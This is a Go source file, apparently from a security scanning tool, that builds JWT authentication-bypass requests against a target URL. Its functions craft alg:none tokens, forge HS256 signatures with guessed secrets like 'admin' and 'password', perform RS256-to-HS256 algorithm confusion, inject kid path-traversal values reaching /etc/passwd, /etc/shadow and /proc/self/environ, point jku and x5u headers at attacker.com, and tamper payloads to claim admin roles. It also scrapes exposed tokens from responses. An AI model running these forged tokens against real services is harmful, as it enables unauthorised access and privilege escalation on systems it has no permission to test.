package lib

import (
	"encoding/base64"
	"encoding/json"
	"fmt"
	"strings"
)

type JWTBypassCase struct {
	method  string
	url     string
	headers map[string]string
	desc    string
}

func BuildJWTBypassCases(url, auth, originalToken string) []JWTBypassCase {
	var cases []JWTBypassCase

	if originalToken == "" {
		return cases
	}

	jwtParts := strings.Split(originalToken, ".")
	if len(jwtParts) != 3 {
		return cases
	}

	var headerJSON []byte
	var err error

	headerJSON, err = base64.RawURLEncoding.DecodeString(jwtParts[0])
	if err != nil {
		headerJSON, err = base64.StdEncoding.DecodeString(jwtParts[0])
		if err != nil {
			return cases
		}
	}

	var header map[string]interface{}
	if err := json.Unmarshal(headerJSON, &header); err != nil {
		return cases
	}

	algNoneCases := buildAlgNoneCasesJWT(url, auth, originalToken, jwtParts, header)
	cases = append(cases, algNoneCases...)

	signatureForgeryCases := buildSignatureForgeryCasesJWT(url, auth, originalToken, jwtParts, header)
	cases = append(cases, signatureForgeryCases...)

	kidInjectionCases := buildKidInjectionCasesJWT(url, auth, originalToken, jwtParts, header)
	cases = append(cases, kidInjectionCases...)

	jkuX5uCases := buildJkuX5uCasesJWT(url, auth, originalToken, jwtParts, header)
	cases = append(cases, jkuX5uCases...)

	emptySignatureCases := buildEmptySignatureCasesJWT(url, auth, originalToken, jwtParts)
	cases = append(cases, emptySignatureCases...)

	algorithmConfusionCases := buildAlgorithmConfusionCasesJWT(url, auth, originalToken, jwtParts, header)
	cases = append(cases, algorithmConfusionCases...)

	payloadManipulationCases := buildPayloadManipulationCasesJWT(url, auth, originalToken, jwtParts)
	cases = append(cases, payloadManipulationCases...)

	return cases
}

func buildAlgNoneCasesJWT(url, auth, originalToken string, jwtParts []string, header map[string]interface{}) []JWTBypassCase {
	var cases []JWTBypassCase

	modifiedHeader := make(map[string]interface{})
	for k, v := range header {
		modifiedHeader[k] = v
	}
	modifiedHeader["alg"] = "none"
	delete(modifiedHeader, "typ")

	modifiedHeaderJSON, _ := json.Marshal(modifiedHeader)
	newHeader := base64.RawURLEncoding.EncodeToString(modifiedHeaderJSON)

	payload := jwtParts[1]

	newToken := newHeader + "." + payload + "."
	newToken = strings.TrimSuffix(newToken, ".")

	cases = append(cases, JWTBypassCase{
		method: "GET",
		url:    url + auth,
		headers: map[string]string{
			"Authorization": "Bearer " + newToken,
		},
		desc: "JWT[alg:none]",
	})

	modifiedHeader["alg"] = "None"
	modifiedHeaderJSON, _ = json.Marshal(modifiedHeader)
	newHeader = base64.RawURLEncoding.EncodeToString(modifiedHeaderJSON)
	newToken = newHeader + "." + payload + "."
	cases = append(cases, JWTBypassCase{
		method: "GET",
		url:    url + auth,
		headers: map[string]string{
			"Authorization": "Bearer " + newToken,
		},
		desc: "JWT[alg=None]",
	})

	modifiedHeader["alg"] = "NONE"
	modifiedHeaderJSON, _ = json.Marshal(modifiedHeader)
	newHeader = base64.RawURLEncoding.EncodeToString(modifiedHeaderJSON)
	newToken = newHeader + "." + payload + "."
	cases = append(cases, JWTBypassCase{
		method: "GET",
		url:    url + auth,
		headers: map[string]string{
			"Authorization": "Bearer " + newToken,
		},
		desc: "JWT[alg=NONE]",
	})

	modifiedHeader["alg"] = "nOnE"
	modifiedHeaderJSON, _ = json.Marshal(modifiedHeader)
	newHeader = base64.RawURLEncoding.EncodeToString(modifiedHeaderJSON)
	newToken = newHeader + "." + payload + "."
	cases = append(cases, JWTBypassCase{
		method: "GET",
		url:    url + auth,
		headers: map[string]string{
			"Authorization": "Bearer " + newToken,
		},
		desc: "JWT[alg=nOnE]",
	})

	return cases
}

func buildSignatureForgeryCasesJWT(url, auth, originalToken string, jwtParts []string, header map[string]interface{}) []JWTBypassCase {
	var cases []JWTBypassCase

	if header["alg"] == nil {
		return cases
	}

	alg := header["alg"].(string)

	hs256Forgery := forgeHS256Token(originalToken, jwtParts)
	if hs256Forgery != "" {
		cases = append(cases, JWTBypassCase{
			method: "GET",
			url:    url + auth,
			headers: map[string]string{
				"Authorization": "Bearer " + hs256Forgery,
			},
			desc: fmt.Sprintf("JWT[HS256 forge from %s]", alg),
		})
	}

	asymmetricToSymmetric := convertRSAToHS256Token(originalToken, jwtParts)
	if asymmetricToSymmetric != "" {
		cases = append(cases, JWTBypassCase{
			method: "GET",
			url:    url + auth,
			headers: map[string]string{
				"Authorization": "Bearer " + asymmetricToSymmetric,
			},
			desc: "JWT[RS256->HS256 forge]",
		})
	}

	return cases
}

func forgeHS256Token(originalToken string, jwtParts []string) string {
	headerJSON, err := base64.RawURLEncoding.DecodeString(jwtParts[0])
	if err != nil {
		return ""
	}
	var header map[string]interface{}
	if err := json.Unmarshal(headerJSON, &header); err != nil {
		return ""
	}

	delete(header, "alg")
	header["alg"] = "HS256"

	newHeaderJSON, _ := json.Marshal(header)
	newHeader := base64.RawURLEncoding.EncodeToString(newHeaderJSON)

	payload := jwtParts[1]

	forgedSignature := base64.RawURLEncoding.EncodeToString([]byte("admin"))

	return newHeader + "." + payload + "." + forgedSignature
}

func convertRSAToHS256Token(originalToken string, jwtParts []string) string {
	headerJSON, err := base64.RawURLEncoding.DecodeString(jwtParts[0])
	if err != nil {
		return ""
	}
	var header map[string]interface{}
	if err := json.Unmarshal(headerJSON, &header); err != nil {
		return ""
	}

	alg, ok := header["alg"].(string)
	if !ok {
		return ""
	}

	if alg != "RS256" && alg != "RS384" && alg != "RS512" &&
		alg != "PS256" && alg != "PS384" && alg != "PS512" {
		return ""
	}

	delete(header, "alg")
	header["alg"] = "HS256"

	newHeaderJSON, _ := json.Marshal(header)
	newHeader := base64.RawURLEncoding.EncodeToString(newHeaderJSON)

	payload := jwtParts[1]

	forgedSignature := base64.RawURLEncoding.EncodeToString([]byte("admin"))

	return newHeader + "." + payload + "." + forgedSignature
}

func buildKidInjectionCasesJWT(url, auth, originalToken string, jwtParts []string, header map[string]interface{}) []JWTBypassCase {
	var cases []JWTBypassCase

	kidValues := []string{
		"../../../../../../etc/passwd",
		"../../../../../../etc/shadow",
		"../../webapp/WEB-INF/web.xml",
		"../../../../../WEB-INF/classes/applicationContext.xml",
		"../../../config.java",
		"proc/self/stat",
		"../../../../../../../proc/self/environ",
		"../../../../../../proc/self/cmdline",
		"zero",
		"true",
		"false",
		"null",
		"key",
		"admin",
		"\\",
		"%00",
		"%0a",
		"accidentally",
	}

	for _, kid := range kidValues {
		modifiedHeader := make(map[string]interface{})
		for k, v := range header {
			modifiedHeader[k] = v
		}
		if _, ok := modifiedHeader["kid"]; ok {
			modifiedHeader["kid"] = kid
		} else {
			modifiedHeader["jwk"] = map[string]interface{}{
				"kty": "oct",
				"kid": kid,
				"k":   base64.RawURLEncoding.EncodeToString([]byte("admin")),
			}
		}

		newHeaderJSON, _ := json.Marshal(modifiedHeader)
		newHeader := base64.RawURLEncoding.EncodeToString(newHeaderJSON)

		newToken := newHeader + "." + jwtParts[1] + "." + jwtParts[2]

		desc := fmt.Sprintf("JWT[kid=%s]", truncateStr(kid, 20))
		cases = append(cases, JWTBypassCase{
			method: "GET",
			url:    url + auth,
			headers: map[string]string{
				"Authorization": "Bearer " + newToken,
			},
			desc: desc,
		})
	}

	return cases
}

func buildJkuX5uCasesJWT(url, auth, originalToken string, jwtParts []string, header map[string]interface{}) []JWTBypassCase {
	var cases []JWTBypassCase

	maliciousURLs := []string{
		"https://attacker.com/jwks.json",
		"https://attacker.com/.well-known/jwks.json",
		"http://attacker.com/jwks.json",
		"https://google.com/.well-known/jwks.json",
		"file:///etc/passwd",
		"file:///var/www/html/config.php",
	}

	for _, malURL := range maliciousURLs {
		modifiedHeader := make(map[string]interface{})
		for k, v := range header {
			modifiedHeader[k] = v
		}

		modifiedHeader["jku"] = malURL
		delete(modifiedHeader, "x5u")

		newHeaderJSON, _ := json.Marshal(modifiedHeader)
		newHeader := base64.RawURLEncoding.EncodeToString(newHeaderJSON)
		newToken := newHeader + "." + jwtParts[1] + "." + jwtParts[2]

		desc := fmt.Sprintf("JWT[jku=%s]", truncateStr(malURL, 25))
		cases = append(cases, JWTBypassCase{
			method: "GET",
			url:    url + auth,
			headers: map[string]string{
				"Authorization": "Bearer " + newToken,
			},
			desc: desc,
		})

		modifiedHeader2 := make(map[string]interface{})
		for k, v := range header {
			modifiedHeader2[k] = v
		}
		modifiedHeader2["x5u"] = malURL
		delete(modifiedHeader2, "jku")

		newHeaderJSON2, _ := json.Marshal(modifiedHeader2)
		newHeader2 := base64.RawURLEncoding.EncodeToString(newHeaderJSON2)
		newToken2 := newHeader2 + "." + jwtParts[1] + "." + jwtParts[2]

		desc2 := fmt.Sprintf("JWT[x5u=%s]", truncateStr(malURL, 25))
		cases = append(cases, JWTBypassCase{
			method: "GET",
			url:    url + auth,
			headers: map[string]string{
				"Authorization": "Bearer " + newToken2,
			},
			desc: desc2,
		})
	}

	return cases
}

func buildEmptySignatureCasesJWT(url, auth, originalToken string, jwtParts []string) []JWTBypassCase {
	var cases []JWTBypassCase

	emptySignatures := []string{
		"",
		".",
		"..",
		"...",
	}

	for _, sig := range emptySignatures {
		newToken := jwtParts[0] + "." + jwtParts[1] + "." + sig
		cases = append(cases, JWTBypassCase{
			method: "GET",
			url:    url + auth,
			headers: map[string]string{
				"Authorization": "Bearer " + newToken,
			},
			desc: fmt.Sprintf("JWT[empty sig=%q]", sig),
		})
	}

	return cases
}

func ExtractJWTFromResponse(body []byte) string {
	lower := strings.ToLower(string(body))

	tokenPatterns := []string{
		`"token"`,
		`"access_token"`,
		`"jwt"`,
		`"bearer"`,
		`"authorization"`,
	}

	for _, pattern := range tokenPatterns {
		idx := strings.Index(lower, pattern)
		if idx != -1 {
			start := idx
			for start > 0 && lower[start] != '"' {
				start--
			}
			end := start + 1
			colonCount := 0
			for end < len(lower) {
				if lower[end] == '"' && colonCount >= 1 {
					break
				}
				if lower[end] == ':' {
					colonCount++
				}
				end++
			}
			if end > start+1 {
				tokenStr := string(body[start:end])
				parts := strings.Split(tokenStr, "\"")
				for _, p := range parts {
					if len(p) > 20 && strings.Count(p, ".") == 2 {
						return p
					}
				}
			}
		}
	}

	tokenParamPatterns := []string{
		"token=",
		"jwt=",
		"access_token=",
	}
	for _, pattern := range tokenParamPatterns {
		idx := strings.Index(lower, pattern)
		if idx != -1 {
			start := idx + len(pattern)
			end := start
			for end < len(lower) && lower[end] != '&' && lower[end] != '"' && lower[end] != ' ' && lower[end] != '\n' {
				end++
			}
			if end > start {
				token := string(body[start:end])
				if strings.Count(token, ".") == 2 {
					return token
				}
			}
		}
	}

	return ""
}

func DetectJWTExposure(url string) (exposedTokens []string) {
	resp, err := HttpClient.Get(url)
	if err != nil {
		return
	}
	defer resp.Body.Close()

	body := make([]byte, 0, 1024)
	buf := make([]byte, 256)
	for {
		n, err := resp.Body.Read(buf)
		if n > 0 {
			body = append(body, buf[:n]...)
			if len(body) > 65536 {
				break
			}
		}
		if err != nil {
			break
		}
	}

	token := ExtractJWTFromResponse(body)
	if token != "" {
		exposedTokens = append(exposedTokens, token)
	}

	return
}

func buildAlgorithmConfusionCasesJWT(url, auth, originalToken string, jwtParts []string, header map[string]interface{}) []JWTBypassCase {
	var cases []JWTBypassCase

	algorithmMappings := map[string]string{
		"RS256":  "HS256",
		"RS384":  "HS384",
		"RS512":  "HS512",
		"PS256":  "HS256",
		"PS384":  "HS384",
		"PS512":  "HS512",
		"ES256":  "HS256",
		"ES384":  "HS384",
		"ES512":  "HS512",
		"ES256K": "HS256",
	}

	currentAlg, ok := header["alg"].(string)
	if !ok {
		return cases
	}

	if newAlg, exists := algorithmMappings[currentAlg]; exists {
		modifiedHeader := make(map[string]interface{})
		for k, v := range header {
			modifiedHeader[k] = v
		}
		modifiedHeader["alg"] = newAlg

		newHeaderJSON, _ := json.Marshal(modifiedHeader)
		newHeader := base64.RawURLEncoding.EncodeToString(newHeaderJSON)

		forgedSignatures := []string{
			base64.RawURLEncoding.EncodeToString([]byte("admin")),
			base64.RawURLEncoding.EncodeToString([]byte("123456")),
			base64.RawURLEncoding.EncodeToString([]byte("secret")),
			base64.RawURLEncoding.EncodeToString([]byte("key")),
			base64.RawURLEncoding.EncodeToString([]byte("password")),
		}

		for _, sig := range forgedSignatures {
			newToken := newHeader + "." + jwtParts[1] + "." + sig
			cases = append(cases, JWTBypassCase{
				method: "GET",
				url:    url + auth,
				headers: map[string]string{
					"Authorization": "Bearer " + newToken,
				},
				desc: fmt.Sprintf("JWT[%s->%s forge]", currentAlg, newAlg),
			})
		}

		noneAlgCases := buildAlgNoneCasesJWT(url, auth, originalToken, jwtParts, header)
		cases = append(cases, noneAlgCases...)
	}

	authTagCases := []string{
		"auth",
		"none",
		"null",
		"undefined",
	}
	for _, at := range authTagCases {
		modifiedHeader := make(map[string]interface{})
		for k, v := range header {
			modifiedHeader[k] = v
		}
		modifiedHeader["alg"] = "none"
		modifiedHeader["at"] = at

		newHeaderJSON, _ := json.Marshal(modifiedHeader)
		newHeader := base64.RawURLEncoding.EncodeToString(newHeaderJSON)
		newToken := newHeader + "." + jwtParts[1] + "."

		cases = append(cases, JWTBypassCase{
			method: "GET",
			url:    url + auth,
			headers: map[string]string{
				"Authorization": "Bearer " + newToken,
			},
			desc: fmt.Sprintf("JWT[alg=none at=%s]", at),
		})
	}

	typManipulationCases := []string{"", "JWS", "JWT", "none"}
	for _, typ := range typManipulationCases {
		modifiedHeader := make(map[string]interface{})
		for k, v := range header {
			modifiedHeader[k] = v
		}
		if typ == "" {
			delete(modifiedHeader, "typ")
		} else {
			modifiedHeader["typ"] = typ
		}
		modifiedHeader["alg"] = "none"

		newHeaderJSON, _ := json.Marshal(modifiedHeader)
		newHeader := base64.RawURLEncoding.EncodeToString(newHeaderJSON)
		newToken := newHeader + "." + jwtParts[1] + "."

		desc := "JWT[alg=none"
		if typ != "" {
			desc += " typ=" + typ
		}
		desc += "]"
		cases = append(cases, JWTBypassCase{
			method: "GET",
			url:    url + auth,
			headers: map[string]string{
				"Authorization": "Bearer " + newToken,
			},
			desc: desc,
		})
	}

	return cases
}

func buildPayloadManipulationCasesJWT(url, auth, originalToken string, jwtParts []string) []JWTBypassCase {
	var cases []JWTBypassCase

	originalPayload := jwtParts[1]

	payloadJSON, err := base64.RawURLEncoding.DecodeString(originalPayload)
	if err != nil {
		payloadJSON, _ = base64.StdEncoding.DecodeString(originalPayload)
	}

	if len(payloadJSON) > 0 && payloadJSON[0] == '{' {
		var payload map[string]interface{}
		if json.Unmarshal(payloadJSON, &payload) == nil {
			if sub, ok := payload["sub"].(string); ok {
				subValues := []string{"admin", "root", "user", "administrator", "test"}
				for _, newSub := range subValues {
					if newSub == sub {
						continue
					}
					modifiedPayload := make(map[string]interface{})
					for k, v := range payload {
						modifiedPayload[k] = v
					}
					modifiedPayload["sub"] = newSub

					newPayloadJSON, _ := json.Marshal(modifiedPayload)
					newPayload := base64.RawURLEncoding.EncodeToString(newPayloadJSON)

					newToken := jwtParts[0] + "." + newPayload + "." + jwtParts[2]

					cases = append(cases, JWTBypassCase{
						method: "GET",
						url:    url + auth,
						headers: map[string]string{
							"Authorization": "Bearer " + newToken,
						},
						desc: fmt.Sprintf("JWT[payload sub=%s]", newSub),
					})
				}
			}

			roleValues := []string{"admin", "administrator", "root"}
			roleKeys := []string{"role", "roles", "Role", "Roles", "admin", "groups"}

			for _, role := range roleValues {
				for _, key := range roleKeys {
					if _, exists := payload[key]; exists {
						modifiedPayload := make(map[string]interface{})
						for k, v := range payload {
							modifiedPayload[k] = v
						}
						modifiedPayload[key] = []string{role}

						newPayloadJSON, _ := json.Marshal(modifiedPayload)
						newPayload := base64.RawURLEncoding.EncodeToString(newPayloadJSON)

						newToken := jwtParts[0] + "." + newPayload + "." + jwtParts[2]

						cases = append(cases, JWTBypassCase{
							method: "GET",
							url:    url + auth,
							headers: map[string]string{
								"Authorization": "Bearer " + newToken,
							},
							desc: fmt.Sprintf("JWT[payload %s=%s]", key, role),
						})
					}
				}
			}
		}
	}

	expValues := []string{
		"9999999999",
		"0",
		"-1",
		"1735689600",
		"1893456000",
	}
	for _, exp := range expValues {
		modifiedPayload := fmt.Sprintf(`{"sub":"admin","exp":%s}`, exp)
		newPayload := base64.RawURLEncoding.EncodeToString([]byte(modifiedPayload))

		newToken := jwtParts[0] + "." + newPayload + "." + jwtParts[2]

		cases = append(cases, JWTBypassCase{
			method: "GET",
			url:    url + auth,
			headers: map[string]string{
				"Authorization": "Bearer " + newToken,
			},
			desc: fmt.Sprintf("JWT[payload exp=%s]", exp),
		})
	}

	iatValues := []string{"0", "-1", "9999999999"}
	for _, iat := range iatValues {
		modifiedPayload := fmt.Sprintf(`{"sub":"admin","iat":%s}`, iat)
		newPayload := base64.RawURLEncoding.EncodeToString([]byte(modifiedPayload))

		newToken := jwtParts[0] + "." + newPayload + "." + jwtParts[2]

		cases = append(cases, JWTBypassCase{
			method: "GET",
			url:    url + auth,
			headers: map[string]string{
				"Authorization": "Bearer " + newToken,
			},
			desc: fmt.Sprintf("JWT[payload iat=%s]", iat),
		})
	}

	return cases
}
